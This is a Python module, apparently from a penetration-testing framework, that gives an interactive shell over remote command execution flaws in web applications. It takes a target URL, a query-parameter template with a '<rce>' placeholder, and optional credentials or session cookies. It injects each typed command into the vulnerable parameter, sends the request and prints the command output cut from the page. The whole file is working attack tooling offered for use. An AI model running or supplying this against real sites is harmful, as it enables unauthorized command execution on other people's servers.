import framework
# unique to module
import urllib

class Module(framework.module):

    def __init__(self, params):
        framework.module.__init__(self, params)
        self.register_option('base_url', None, 'yes', 'the target resource url excluding any parameters')
        self.register_option('parameters', None, 'yes', 'the query parameters with \'<rce>\' signifying the value of the vulnerable parameter')
        self.register_option('basic_user', None, 'no', 'username for basic authentication')
        self.register_option('basic_pass', None, 'no', 'password for basic authentication')
        self.register_option('cookie', None, 'no', 'cookie string containing authenticated session data')
        self.register_option('post', False, 'yes', 'set the request method to post. parameters should still be submitted in the url option')
        self.register_option('mark_start', None, 'no', 'string to match page content preceding the command output')
        self.register_option('mark_end', None, 'no', 'string to match page content following the command output')
        self.info = {
                     'Name': 'Remote Commnd Execution Shell Interface',
                     'Author': 'Tim Tomes (@LaNMaSteR53)',
                     'Description': 'Provides a shell interface for remote command execution flaws in web applications.',
                     'Comments': []
                     }

    def help(self):
        return 'Type \'exit\' or \'ctrl-c\' to exit the shell.'

    def parse_params(self, params):
        params = params.split('&')
        params = [param.split('=') for param in params]
        return [(urllib.unquote_plus(param[0]), urllib.unquote_plus(param[1])) for param in params]

    def module_run(self):
        base_url = self.options['base_url']['value']
        base_params = self.options['parameters']['value']
        username = self.options['basic_user']['value']
        password = self.options['basic_pass']['value']
        cookie = self.options['cookie']['value']
        start = self.options['mark_start']['value']
        end = self.options['mark_end']['value']

        # process authentication
        auth = (username, password) if username and password else ()
        headers = {'Cookie': cookie} if cookie else {}

        # set the request method
        method = 'POST' if self.options['post']['value'] else 'GET'

        print 'Type \'help\' or \'?\' for assistance.'
        while True:
            # get command from the terminal
            cmd = raw_input("cmd> ")
            if cmd.lower() == 'exit': return
            elif cmd.lower() in ['help', '?']:
                print self.help()
                continue
            # build the payload from the base_params string
            payload = {}
            params = self.parse_params(base_params.replace('<rce>', cmd))
            for param in params:
                payload[param[0]] = param[1]
            # send the request
            resp = self.request(base_url, method=method, payload=payload, headers=headers, auth=auth)
            # process the response
            output = resp.text
            if start and end:
                try: output = output[output.index(start)+len(start):]
                except ValueError: self.error('Invalid start marker.')
                try: output = output[:output.index(end)]
                except ValueError: self.error('Invalid end marker.')
            print '%s' % (output.strip())